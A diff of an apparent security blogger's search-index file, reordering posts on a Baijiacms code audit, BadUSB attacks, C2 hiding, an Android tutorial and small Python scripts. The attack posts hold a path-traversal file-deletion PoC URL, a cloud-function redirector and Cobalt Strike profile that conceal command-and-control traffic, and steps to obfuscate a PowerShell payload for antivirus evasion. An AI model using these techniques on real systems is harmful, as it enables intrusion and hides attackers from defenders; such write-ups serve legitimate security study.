@@ -1,207 +1,62 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Baijiacms 代码审计</title>
-    <url>/2022/11/26/Baijiacms-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
-    <content><![CDATA[<h2 id="系统路由"><a href="#系统路由" class="headerlink" title="系统路由"></a>系统路由</h2><p>这个系统采用的路由大部分由两步组成，我暂且给他们命名为模块，文件</p>
-<h3 id="定位模块"><a href="#定位模块" class="headerlink" title="定位模块"></a>定位模块</h3><p>先总结，定位模块由请求参数 act 决定。比如下面的url。就会定位到manager模块下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;baijiacmsV4-4.1.4&#x2F;index.php?mod&#x3D;site&amp;act&#x3D;manager&amp;do&#x3D;database&amp;op&#x3D;delete</span><br></pre></td></tr></table></figure>
-
-
-
-<p>系统从index.php文件出发，进行一些关系不是很大的判断后。走到</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;includes/baijiacms.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
-<p>然后在这个文件里，都是一些简单的过滤（htmlspecialchars），整理请求参数（$_GP = array_merge($_GET, $_POST, $_GP);），以及数据库信息，常用函数文件的包含等。<br>这几段代码要关注一下。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GP</span>[<span class="string">&#x27;m&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$modulename</span> = <span class="variable">$_GP</span>[<span class="string">&#x27;act&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$modulename</span> = <span class="variable">$_GP</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">………………</span><br><span class="line">………………</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="variable">$_CMS</span>[<span class="string">&#x27;module&#x27;</span>]=<span class="variable">$modulename</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>这里主要是从请求中提取m或者act参数。取作$modulename，也就是模块名字，模块就是系统目录下的system文件夹下的文件。可以看到模块文件都很统一，都是两个文件夹class和template，两个文件mobile.php和web.php。偶尔有几个模块会有addons.php和common.php。</p>
-<p><img src="image-20221126175943465.png" alt="image-20221126175943465"></p>
-<p>在确定了$modulename后。代码走到下面的runner.inc.php文件才开始路由。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> WEB_ROOT.<span class="string">&#x27;/includes/baijiacms/runner.inc.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
-<p>路由从第二个if判断开始。这个isaddons又出现了，判断是否是插件（没细看代码，从变量命名来判断的）。这里主要关注参数 $modulename和$file  ，代码会将$modulename拼接，定向到对应模块下的mobile.php 或web.php文件内。</p>
-<p><img src="image-20221126180243104.png" alt="image-20221126180243104"></p>
-<h3 id="定位文件"><a href="#定位文件" class="headerlink" title="定位文件"></a>定位文件</h3><p>先总结，定位模块由请求参数 do 决定。比如下面的url。就会定位到manager模块下的database.php文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;baijiacmsV4-4.1.4&#x2F;index.php?mod&#x3D;site&amp;act&#x3D;manager&amp;do&#x3D;database&amp;op&#x3D;delete</span><br></pre></td></tr></table></figure>
-
-
-
-<p>直接来到/includes/baijiacms/runner.inc.php 文件中。找到这一行代码，（可能会找到两处，没关系，看第二处就行，第一处应该是判断插件模块额外判断的）</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method</span> = <span class="string">&#x27;do_&#x27;</span>.<span class="variable">$_GP</span>[<span class="string">&#x27;do&#x27;</span>];</span><br></pre></td></tr></table></figure>
-
-<p>在这里代码会给$do加上一个”do_”。比如上例的do=database。就会变成do_database复制给$method</p>
-<p><img src="image-20221126181927429.png" alt="image-20221126181927429"></p>
-<p>在赋值，判断该方法存在后，就又把do_给去掉，拼接成文件名。跳到模块对应文件中了。</p>
-<p><img src="image-20221126182305948.png" alt="image-20221126182305948"></p>
-<p><img src="image-20221126182434549.png" alt="image-20221126182434549"></p>
-<p>这里$filephp=”manager/class/web/database.php”</p>
-<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>见上篇</p>
-<h2 id="文件删除漏洞"><a href="#文件删除漏洞" class="headerlink" title="文件删除漏洞"></a>文件删除漏洞</h2><p>（事后发现已经被人挖到了。<a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25873">CVE-2020-25873<i class="fas fa-external-link-alt"></i></a>）</p>
-<p>漏洞点在system/manager/class/web/database.php文件中第253行的rmdirs($path . $d);</p>
-<p><img src="image-20221127012249402.png" alt="image-20221127012249402"></p>
-<p>首先需要访问首页的备份与还原，备份一次，因为初始状态下，/config/data_backup/文件夹是不存在的，如果不进行备份来创建该文件夹，后续在</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_dir(<span class="variable">$path</span> . <span class="variable">$d</span>)) </span><br></pre></td></tr></table></figure>
-
-<p>这里判断时会一直false。</p>
-<p>在rmdirs函数中，会递归删除传入的文件夹中<strong>所有文件</strong>。</p>
-<p><img src="image-20221127012832594.png" alt="image-20221127012832594"></p>
-<p>这里我在测试时，在/tmp目录下创建了一个test文件夹。在文件夹下创建了两个文件passwd和shadow。</p>
-<p><img src="image-20221127013041995.png" alt="image-20221127013041995"></p>
-<p>随后就可以开始构造payload。其中前面的act=manager&amp;do=database&amp;op=delete是为了使代码走到这里，id的值为../../../../../../../../../../../../../../tmp/test的base64编码</p>
-<p>POC: <a class="link" href="http://127.0.0.1/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=manager&amp;do=database&amp;op=delete&amp;id=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3Rlc3Q=">http://127.0.0.1/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=manager&amp;do=database&amp;op=delete&amp;id=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3Rlc3Q=<i class="fas fa-external-link-alt"></i></a></p>
-<p><img src="image-20221127013748784.png" alt="image-20221127013748784"></p>
-<p>遍历所有文件，拼接路径，随后使用unlink删除</p>
-<p><img src="image-20221127013819234.png" alt="image-20221127013819234"></p>
-<p><img src="image-20221127013847753.png" alt="image-20221127013847753"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>BadUSB 利用</title>
-    <url>/2020/08/19/BadUSB%20%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13532603.html">源地址：https://www.cnblogs.com/This-is-Y/p/13532603.html<i class="fas fa-external-link-alt"></i></a></p>
-<p><strong>BadUSB以及编译工具准备</strong></p>
-<p>淘宝买的，不包邮，花了30几块大洋</p>
-<p>链接就不放了，需要的私信</p>
-<p>到手后有一个小包装袋装着，一块芯片，其他三个都是U盘的外壳，拼好长这样</p>
-<p>一般来说你都可以去找卖家要写好的脚本和教程</p>
-<img src="1503868-20200819232126353-1239224496.jpg" width="1000" loading="lazy">
-
-<p>编译工具用arduino</p>
-<p>官网地址：<a class="link" href="https://www.arduino.cc/en/Main/Software">https://www.arduino.cc/en/Main/Software<i class="fas fa-external-link-alt"></i></a></p>
-<p>也可以直接通过这个地址下载：<a class="link" href="https://downloads.arduino.cc/arduino-nightly-windows.zip">https://downloads.arduino.cc/arduino-nightly-windows.zip<i class="fas fa-external-link-alt"></i></a></p>
-<p> </p>
-<p>驱动下载：<a class="link" href="https://pan.baidu.com/s/1YNpOORUnYBgLCfhy-5m4yA">https://pan.baidu.com/s/1YNpOORUnYBgLCfhy-5m4yA<i class="fas fa-external-link-alt"></i></a> 提取码: vpye</p>
-<p>安装完驱动后，打开arduino</p>
-<p>在文件-&gt; 首选项 中，添加一条<a class="link" href="http://digistump.com/package_digistump_index.json">http://digistump.com/package_digistump_index.json<i class="fas fa-external-link-alt"></i></a></p>
-<p> <img src="1503868-20200819233552997-1802551828.png" alt loading="lazy"></p>
-<p> </p>
-<p> 再打开工具-&gt;  开发板-&gt;开发板管理器</p>
-<img src="1503868-20200819233718816-1360516057.png" alt loading="lazy">
+    <title>Android studio新建一个activity</title>
+    <url>/2021/03/17/Android%20studio%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AAactivity/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14551779.html">源地址：https://www.cnblogs.com/This-is-Y/p/14551779.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>1、</strong></p>
+<p>res-&gt;layout右键新建一个xml-&gt;layout xml file</p>
+<img src="1503868-20210317195835357-70993166.png" alt loading="lazy">
 
 <p> </p>
-<p> 等待下载完毕索引，搜索Digistump，下载，下载失败的话，就科学网上冲浪</p>
-<img src="1503868-20200819233956631-2028299896.png" alt loading="lazy">
+<p> 名字，布局</p>
+<img src="1503868-20210317195920797-142464714.png" alt loading="lazy">
 
 <p> </p>
-<p>下载完成后，在切换到Digistump</p>
-<img src="1503868-20200819234144022-1096082656.png" alt loading="lazy">
-
+<p> 然后随便写点东西到新建的xml文件中</p>
 <p> </p>
-<p>这样的话，在打开，示例中可以找到这些东西</p>
-<img src="1503868-20200819234409907-784646639.png" alt loading="lazy">
+<img src="1503868-20210317200228775-1982566868.png" alt loading="lazy">
 
-<p>写好代码按√编译，按-&gt;上传到U盘中，</p>
-<img src="1503868-20200819232801145-1814212514.png" alt loading="lazy">
-
-<p> 一般编译用来检测代码是否有问题，当没问题后，就可以点上传，等到下面出现这个提示的时候，就可以插上U盘等待写入了</p>
-<p> <img src="1503868-20200819233458537-779180168.png" alt loading="lazy"></p>
 <p> </p>
 <p> </p>
 <p> </p>
-<p><strong>CS生成文件</strong></p>
-<p> 打开cs，建立监听器</p>
-<p>监听器默认的就行</p>
-<p>选择payload generator</p>
-<img src="1503868-20200819235156260-559494600.png" alt loading="lazy">
+<p><strong>2、</strong></p>
+<p>app-&gt;java-&gt;第一个 。右键-&gt;新建-&gt;java类</p>
+<img src="1503868-20210317200317728-1094209561.png" alt loading="lazy">
 
 <p> </p>
-<p> 选择powershell</p>
-<img src="1503868-20200819235320606-293181371.png" alt loading="lazy">
-
-<p> 然后会生成一个ps1文件</p>
 <p> </p>
-<p><strong>混淆免杀</strong></p>
-<p>使用Invoke-Obfuscation</p>
-<p>github地址：github:<a class="link" href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation<i class="fas fa-external-link-alt"></i></a></p>
-<p>在powershell中cd到Invoke-Obfuscation文件目录下，或者直接在Invoke-Obfuscation中打开powershell</p>
-<p>执行</p>
-<p>Import-Module .\Invoke-Obfuscation.psd1<br>Invoke-Obfuscation</p>
-<p>可能会报错，如果是未找到模块，则是文件路径不对，如果是禁止运行脚本</p>
-<img src="1503868-20200819095942080-854380167.png" alt>
-
-<p> 出现这种情况以管理员权限打开powershell</p>
-<p>执行Set-ExecutionPolicy Unrestricted，选择y</p>
-<img src="1503868-20200819100043882-63431022.png" alt loading="lazy">
-
+<p> <img src="1503868-20210317200419083-640819000.png" alt loading="lazy"></p>
 <p> </p>
-<p>之后重新打开powershell窗口就好了</p>
-<p>正确执行完后是这样的</p>
-<img src="1503868-20200819095036912-531561032.png" alt>
-
-<p>然后执行命令，指定待处理的Ps1文件<br><br>　　set scriptpath 文件路径<br><br>或者指定待处理的ps代码<br><br>　　set scriptblock ‘echo xss’</p>
-<p>输入encoding 并选择编码方式</p>
-<p>　　输入数字就行</p>
-<p>输出结果</p>
-<p>　　out 文件位置</p>
 <p> </p>
-<p><strong>最后</strong></p>
-<p>改完了后，把文件上传到服务器，因为我比较懒，整理一个内网穿透工具，在自己电脑上用phpstudy简单弄了一下</p>
-<p>搞完后</p>
-<p>在arduino中把代码上传到u盘中</p>
-<p>代码如下：</p>
-<p>之后编译，上传，在出现这个提示后，把badUSB插入电脑就好了，</p>
-<img src="1503868-20200819192911528-22768958.png" alt loading="lazy">
+<p> 加入代码</p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p><strong>3、</strong></p>
+<p>在app-&gt;manifest-&gt;AndroidManifest.xml文件中的&lt;application&gt;标签内添加一个新标签，注册这个activity</p>
+<p> </p>
+<p>name是新建的activity名字，后面的label、action android:name随意，自己记得就好了</p>
+<p> </p>
+<p>到这一步就已经建完了。配置一个按钮检测一下</p>
+<p> </p>
+<p>在Activity_Main.xml中新建一个按钮，</p>
+<p> </p>
+<p>在MainActivity.java中写onClick函数。不要写在onCreate函数里面了</p>
+<p> </p>
+<img src="1503868-20210317202726826-1982007743.png" alt loading="lazy">
 
 <p> </p>
-<p> 之后可以在自己电脑上插入测试一下。</p>
+<p> 这里的switch用来获取按钮id，用来区分是按下的哪个按钮。后面的这两个东西（）就是之前在manifest文件中添加的&lt;action android:name=“”&gt;。编译器不会联想，要自己输入，区分大小写</p>
+<img src="1503868-20210317202835646-936331724.png" alt loading="lazy">
+
+<p> </p>
+<p> <img src="1503868-20210317202927158-140619376.png" alt loading="lazy"></p>
 <p> </p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
       </categories>
-  </entry>
-  <entry>
-    <title>B站缓存剧集散乱，用python移动，重命名文件</title>
-    <url>/2020/03/05/B%E7%AB%99%E7%BC%93%E5%AD%98%E5%89%A7%E9%9B%86%E6%95%A3%E4%B9%B1%EF%BC%8C%E7%94%A8python%E7%A7%BB%E5%8A%A8%EF%BC%8C%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12423345.html">源地址：https://www.cnblogs.com/This-is-Y/p/12423345.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>使用python的shutil库</p>
-<p>移动</p>
-<p>shutil.move(要移动的文件位置，目标位置）</p>
-<p>复制</p>
-<p>shutil.copy(要移动的文件位置，目标位置）</p>
-<p>如shutil.move(r’E:\41942769\test\111.txt’, r’E:\41942769\test_2\222.txt’)</p>
-<p>(这里加在字符串前面的的r是为了防止 ‘&#39; 转义)</p>
-<p> </p>
-<p>这里是发现b站下载的视频如果有很多集，在文件夹中是如此显示的</p>
-<img src="1503868-20200305222945564-1240341573.png" alt>
-
-<img src="1503868-20200305222935760-32275974.png" alt>
-
-<p> </p>
-<p> <img src="1503868-20200305223031567-526662282.png" alt></p>
-<p> </p>
-<p> 每个视频文件在最后都是0.blv的格式，其他的一些json文件，xml文件是视频信息和弹幕信息。</p>
-<p>这里用了两个小脚本把视频都放在一起，并且把视频文件命名位在B站中看到的名字</p>
-<p>移动</p>
-<p>重命名</p>
-<p>这边在分集下的文件夹中的entry.json文件中找到视频名字，用json稍微操作一下就可以得到视频名字。</p>
-<p>最后结果是这样的</p>
-<img src="1503868-20200305223537903-184238024.png" alt>
-
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>C2隐藏</title>
-    <url>/2021/07/28/C2%E9%9A%90%E8%97%8F/</url>
-    <content><![CDATA[<p>参考：<a class="link" href="https://mp.weixin.qq.com/s/sEzUenuP6lKQVcrDK_sxAw">https://mp.weixin.qq.com/s/sEzUenuP6lKQVcrDK_sxAw<i class="fas fa-external-link-alt"></i></a></p>
-<h2 id="创建云函数"><a href="#创建云函数" class="headerlink" title="创建云函数"></a>创建云函数</h2><p><a class="link" href="https://console.cloud.tencent.com/scf/list?rid=1&amp;ns=default">https://console.cloud.tencent.com/scf/list?rid=1&amp;ns=default<i class="fas fa-external-link-alt"></i></a><br>新建，选自定义，事件函数，代码部署，python3.6<br>代码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf8</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span>(<span class="params">event, context</span>):</span></span><br><span class="line">   response = &#123;&#125;</span><br><span class="line">   path = <span class="literal">None</span></span><br><span class="line">   headers = <span class="literal">None</span></span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       C2=<span class="string">&#x27;你的vpsIP&#x27;</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;path&#x27;</span> <span class="keyword">in</span> event.keys():</span><br><span class="line">           path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;headers&#x27;</span> <span class="keyword">in</span> event.keys():</span><br><span class="line">           headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;httpMethod&#x27;</span> <span class="keyword">in</span> event.keys() <span class="keyword">and</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">           resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>) </span><br><span class="line">       <span class="keyword">else</span>:      </span><br><span class="line">           params=event[<span class="string">&#x27;queryString&#x27;</span>]</span><br><span class="line">           resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,params=params,verify=<span class="literal">False</span>)</span><br><span class="line">           <span class="built_in">print</span>(resp.headers)</span><br><span class="line">           <span class="built_in">print</span>(resp.content)</span><br><span class="line">       response=&#123;</span><br><span class="line">           <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">           <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">           <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">           <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">       <span class="built_in">print</span>(e)</span><br><span class="line">   <span class="keyword">finally</span>:</span><br><span class="line">       <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
-
-<p><img src="image-20210728143619968.png" alt="image-20210728143619968"></p>
-<h2 id="配置触发器"><a href="#配置触发器" class="headerlink" title="配置触发器"></a>配置触发器</h2><p>进入函数，触发管理，创建触发器，触发方式选择API网关触发<br><img src="image-20210728143947251.png" alt="image-20210728143947251"><br><img src="image-20210728143817873.png" alt="image-20210728143817873"></p>
-<h2 id="配置API网关"><a href="#配置API网关" class="headerlink" title="配置API网关"></a>配置API网关</h2><p>配置完触发器后，点进去，编辑<br><img src="image-20210728144053969.png" alt="image-20210728144053969"><br>改一下路径就行了，保存，发布。<br><img src="image-20210728144140112.png" alt="image-20210728144140112"><br>再次点进去，旁边的公网域名就是等下CS创建监听器要用的域名<br><img src="image-20210728144300135.png" alt="image-20210728144300135"></p>
-<h2 id="C2profile"><a href="#C2profile" class="headerlink" title="C2profile"></a>C2profile</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set sample_name &quot;t&quot;;</span><br><span class="line">set sleeptime &quot;3000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident&#x2F;5.0)&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;x&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Nodejs&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;&#x2F;vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;y&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;octet-stream&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>保存，然后带着这个文件启动teamserver，<br>./teamserver IP password xxx.profile</p>
-<h2 id="创建监听器"><a href="#创建监听器" class="headerlink" title="创建监听器"></a>创建监听器</h2><p>如图</p>
-<p><img src="image-20210728145217125.png" alt="image-20210728145217125"></p>
-<p>创建的时候有几点要注意</p>
-<ol>
-<li>HTTP Hosts填写的时候，掐头去尾，把http:// 和后面的 :80删掉，</li>
-<li>由于腾讯云只给了80和443的所以创建的监听器端口也只能是80或443，一一对应</li>
-</ol>
-]]></content>
   </entry>
   <entry>
     <title>AI-Web1靶机渗透</title>
@@ -361,31 +216,207 @@
       </categories>
   </entry>
   <entry>
-    <title>CCF 202006-1 线性分类器 python</title>
-    <url>/2020/08/14/CCF%20202006-1%20%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB%E5%99%A8%20python/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13502978.html">源地址：https://www.cnblogs.com/This-is-Y/p/13502978.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>题目：</p>
-<p>　　线性分类器（line）<br>　　【题目描述】<br>　　考虑一个简单的二分类问题——将二维平面上的点分为A和B两类。<br>　　训练数据包含n个点，其中第i个点（1≤i≤n）可以表示为一个三元组（x,y,type），即该点的横坐标、纵坐标和类别。<br>　　在二维平面上，任意一条直线可以表示为 θ₀+θ₁x+θ₂y=0的形式，即由θ₀，θ₁，θ₂三个参数确定该直线，且满足θ₀，θ₁不同时为0。<br>　　基于这n个已知类别的点，我们想要在平面上找到一条直线作为一个线性分类器。具体来说，这条线要把训练数据中的A、B两类点完美分隔开来，即一侧只有A类点、另一侧只有B类点。这样，对于任意一个的未知类别的点，我们就可以根据它是位于直线的哪一侧来预测它的类别了。<br>　　在本题中我们仅需要处理m个如下查询：给定一条直线，判断它是否能将训练数据中的A、B两类点完美分开。<br>【输入格式】<br>　　从标准输入读入数据。输入共n+m+1行。<br>　　第一行包含用空格分隔的两个正整数n和m，分别表示点和查询的个数。<br>　　第二行到第n+1行依次输入n个点的信息。第i+1行（1≤i≤n）包含用空格分隔的三项x,y和type，分别表示第i个点的横、纵坐标和类别，其中坐标为整数、类别为一个大写英文字母A或B。<br>　　第n+2行到第n+m+1行依次输入m个查询。第j+n+1行（1≤j≤m）包含用空格分隔的三个整数θ₀,θ₁和θ₂，表示第j个查询中给定直线的三个参数。</p>
-<p>【输出格式】<br>　　输出到标准输出。<br>　　输出共m行，每行输出一个字符串。<br>　　第j行（1≤j≤m）输出的字符串对应第个查询的结果：如果给定直线可以完美分隔A、B两类点，则输出Yes；否则输出No。<br>【样例1输入】</p>
-<p>9 3<br>1 1 A<br>1 0 A<br>1 -1 A<br>2 2 B<br>2 3 B<br>0 1 A<br>3 1 B<br>1 3 B<br>2 0 A<br>0 2 -3<br>-3 0 2<br>-3 1 1</p>
-<p>【样例1输出】</p>
-<p>No</p>
-<p>No</p>
-<p>Yes</p>
+    <title>BadUSB 利用</title>
+    <url>/2020/08/19/BadUSB%20%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13532603.html">源地址：https://www.cnblogs.com/This-is-Y/p/13532603.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>BadUSB以及编译工具准备</strong></p>
+<p>淘宝买的，不包邮，花了30几块大洋</p>
+<p>链接就不放了，需要的私信</p>
+<p>到手后有一个小包装袋装着，一块芯片，其他三个都是U盘的外壳，拼好长这样</p>
+<p>一般来说你都可以去找卖家要写好的脚本和教程</p>
+<img src="1503868-20200819232126353-1239224496.jpg" width="1000" loading="lazy">
+
+<p>编译工具用arduino</p>
+<p>官网地址：<a class="link" href="https://www.arduino.cc/en/Main/Software">https://www.arduino.cc/en/Main/Software<i class="fas fa-external-link-alt"></i></a></p>
+<p>也可以直接通过这个地址下载：<a class="link" href="https://downloads.arduino.cc/arduino-nightly-windows.zip">https://downloads.arduino.cc/arduino-nightly-windows.zip<i class="fas fa-external-link-alt"></i></a></p>
 <p> </p>
-<p>代码，用的python，从别人那里扒过来的。已获得同意   </p>
-<p>再补一个我自己写的</p>
+<p>驱动下载：<a class="link" href="https://pan.baidu.com/s/1YNpOORUnYBgLCfhy-5m4yA">https://pan.baidu.com/s/1YNpOORUnYBgLCfhy-5m4yA<i class="fas fa-external-link-alt"></i></a> 提取码: vpye</p>
+<p>安装完驱动后，打开arduino</p>
+<p>在文件-&gt; 首选项 中，添加一条<a class="link" href="http://digistump.com/package_digistump_index.json">http://digistump.com/package_digistump_index.json<i class="fas fa-external-link-alt"></i></a></p>
+<p> <img src="1503868-20200819233552997-1802551828.png" alt loading="lazy"></p>
 <p> </p>
-<p>满分</p>
-<img src="1503868-20200814163333221-1435192584.png" alt loading="lazy">
+<p> 再打开工具-&gt;  开发板-&gt;开发板管理器</p>
+<img src="1503868-20200819233718816-1360516057.png" alt loading="lazy">
 
 <p> </p>
+<p> 等待下载完毕索引，搜索Digistump，下载，下载失败的话，就科学网上冲浪</p>
+<img src="1503868-20200819233956631-2028299896.png" alt loading="lazy">
+
 <p> </p>
+<p>下载完成后，在切换到Digistump</p>
+<img src="1503868-20200819234144022-1096082656.png" alt loading="lazy">
+
+<p> </p>
+<p>这样的话，在打开，示例中可以找到这些东西</p>
+<img src="1503868-20200819234409907-784646639.png" alt loading="lazy">
+
+<p>写好代码按√编译，按-&gt;上传到U盘中，</p>
+<img src="1503868-20200819232801145-1814212514.png" alt loading="lazy">
+
+<p> 一般编译用来检测代码是否有问题，当没问题后，就可以点上传，等到下面出现这个提示的时候，就可以插上U盘等待写入了</p>
+<p> <img src="1503868-20200819233458537-779180168.png" alt loading="lazy"></p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p><strong>CS生成文件</strong></p>
+<p> 打开cs，建立监听器</p>
+<p>监听器默认的就行</p>
+<p>选择payload generator</p>
+<img src="1503868-20200819235156260-559494600.png" alt loading="lazy">
+
+<p> </p>
+<p> 选择powershell</p>
+<img src="1503868-20200819235320606-293181371.png" alt loading="lazy">
+
+<p> 然后会生成一个ps1文件</p>
+<p> </p>
+<p><strong>混淆免杀</strong></p>
+<p>使用Invoke-Obfuscation</p>
+<p>github地址：github:<a class="link" href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation<i class="fas fa-external-link-alt"></i></a></p>
+<p>在powershell中cd到Invoke-Obfuscation文件目录下，或者直接在Invoke-Obfuscation中打开powershell</p>
+<p>执行</p>
+<p>Import-Module .\Invoke-Obfuscation.psd1<br>Invoke-Obfuscation</p>
+<p>可能会报错，如果是未找到模块，则是文件路径不对，如果是禁止运行脚本</p>
+<img src="1503868-20200819095942080-854380167.png" alt>
+
+<p> 出现这种情况以管理员权限打开powershell</p>
+<p>执行Set-ExecutionPolicy Unrestricted，选择y</p>
+<img src="1503868-20200819100043882-63431022.png" alt loading="lazy">
+
+<p> </p>
+<p>之后重新打开powershell窗口就好了</p>
+<p>正确执行完后是这样的</p>
+<img src="1503868-20200819095036912-531561032.png" alt>
+
+<p>然后执行命令，指定待处理的Ps1文件<br><br>　　set scriptpath 文件路径<br><br>或者指定待处理的ps代码<br><br>　　set scriptblock ‘echo xss’</p>
+<p>输入encoding 并选择编码方式</p>
+<p>　　输入数字就行</p>
+<p>输出结果</p>
+<p>　　out 文件位置</p>
+<p> </p>
+<p><strong>最后</strong></p>
